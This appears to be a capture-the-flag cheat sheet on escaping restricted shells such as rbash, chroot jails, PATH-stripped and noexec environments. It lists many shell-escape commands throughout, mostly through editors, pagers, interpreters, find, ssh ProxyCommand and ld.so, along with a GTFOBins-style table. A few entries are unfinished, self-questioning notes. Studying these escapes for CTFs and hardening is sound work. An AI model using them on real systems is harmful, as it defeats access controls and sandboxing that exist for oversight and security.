# Sandboxed Shells — restricted environments, rbash, PATH-less

## The shapes — "shell exists but constrained"

- `rbash`/`rksh`/`rsh` — restricted shells
- `chroot` jail — `/` is a fake root
- PATH stripped — commands not found
- `readonly` vars, `set -r`
- capability/directory lockdown
- `sudo -l`-style allowlist wrappers — `sudo` to ONE cmd only
- `forcecommand` ssh — a fixed command wrapper
- `open_basedir`/`safe_mode` PHP
- busybox minimal — most tools absent

## rbash/rksh restrictions — and their escapes

rbash blocks: `cd`, `/` in commands, `>`/`>>` redirect, `PATH`/`SHELL`/
`ENV` change, `exec`.

Escapes:

```
cp /bin/sh /tmp/x; /tmp/x            — can't: / in name? actually rbash
                                       blocks '/' in COMMAND NAME
./x                                   — relative works?
bash /path/script                     — invokes bash by name (no /? — bash IS /bin/bash — the name lookup goes through PATH)
vi: :!/bin/sh                         — editor escape
less: !sh                             — pager escape
man: !sh
ftp: !sh
python -c 'import os;os.system("/bin/sh")'  — program escape
perl -e 'system("/bin/sh")'
find . -exec /bin/sh \;
awk 'BEGIN{system("/bin/sh")}'
ssh -oProxyCommand='sh' x
env -i /bin/sh                        — env tool exec
BASH_ENV/xtrace tricks
```

The "escape via a program that can exec" family is biggest — `vi`/`less`/
`man`/`more`/`ftp`/`python`/`perl`/`awk`/`sed`/`find`/`tar`/`zip` all
reach a shell — the GTFOBins catalogue.

## PATH-less environment — commands not found

`sh: id: not found` but shell builtins work: `echo`/`cd`/`pwd`/`test`/
`[`/`read`/`kill`/`export`/`type`/`umask`/`wait`. And glob-based exec:

```
/???/cat /flag          — absolute path, no PATH needed
/???/?? /flag
/???/bas? -c 'id'
```

Use absolute paths — PATH is irrelevant.

## `chroot`/container boundary — `/` is fake

`chroot` makes `/jail` the root — files outside invisible. Check:

```
ls /      — is there a real root?
cat /proc/1/cgroup     — container detection
hostname / /proc/version — env tells
```

Escape `chroot` needs root+chroot-syscall or a bind-mount trick —
usually out of scope; instead the target files live INSIDE the jail —
search within.

## `sudo`-only wrappers — `sudo /app/run.sh`

The app runs commands via `sudo` to ONE allowed script — inject into
the script's args or its internal logic, not the shell around sudo.

## `set -r`/`readonly` — shell option lockdown

`set -r` sets restricted — same limits as rbash — same escapes.

## The "run one allowed command" wrapper — `ssh`-forced-command style

`ForceCommand /app/menu` — input becomes menu args — inject into the
arg the menu parses — the menu's own internals (a case/esac) may have
holes (e.g., `case $1 in status) cat /flag;; *) ...`).

## The "binary exists but no exec" pattern — busybox applet exec

`busybox sh`/`busybox nc`/`busybox wget`/`busybox vi`/`busybox awk` —
one binary provides all tools — invoke by `busybox <applet>`.

## `noexec`/readonly mount — exec via loader

`noexec` mount blocks exec bit — but the loader runs anyway:
`/lib64/ld-linux-x86-64.so.2 /path/x` — exec via ld.so — or
`sh /path/script` — interpreter-by-name.

## `nosuid`/jail — when exec is possible but limited

- no SUID → sudo tricks dead
- capabilities — `capsh --print`
- seccomp — `seccomp_dump.py` for the syscall filter
- `unshare`/namespaces — container detection

## The "escape via a different binary" catalogue — GTFOBins core set

| Tool | Exec path |
|---|---|
| `vi`/`vim`/`nvim` | `:!sh` or `:py`/`lua` |
| `less`/`more`/`man`/`most` | `!sh` |
| `find` | `find . -exec sh \;` |
| `awk`/`gawk`/`mawk`/`nawk` | `awk 'BEGIN{system("sh")}'` |
| `sed` | `sed -n 'e sh' x` / `sed 's/x/e sh/e'` |
| `python`/`python3`/`perl`/`ruby`/`php`/`node`/`lua`/`tclsh`/`Rscript` | `-c 'exec'` forms |
| `tar`/`zip`/`7z`/`cpio` | checkpoint/exec actions |
| `ssh` | `-oProxyCommand='sh'` |
| `scp`/`rsync`/`sftp` | `-S`/`--rsh`/`!` escape |
| `ftp`/`tftp`/`telnet`/`nc` | `!sh` / `-e` / `!` |
| `gdb` | `!sh` or `run` |
| `git` | `!sh` in pager/`--exec`/`core.sshCommand` |
| `openssl` | engine load |
| `tee`/`dd`/`cp`/`install`/`rsync`/`curl -o`/`wget -O` | file write |
| `env` | `env sh` |
| `xargs` | `xargs -a /dev/null sh` |
| `make`/`rake` | `make -f file` target exec |
| `jq`/`yq`/`perl` | scripting languages |
| `docker`/`podman`/`kubectl`/`lxc` | container exec — outside scope mostly |
| `socat` | `socat exec:'sh',pty,...` |
| `nmap` | `--interactive` legacy, `--script` |
| `strace`/`ltrace`/`gdb`/`ld.so` | loader/debugger exec |

## Falsifiers

- the environment is a true sandbox (gVisor/seccomp) AND no escape
  binary exists AND chroot with no useful files inside

## Output to record

- which restriction is in force + which escape binary is available
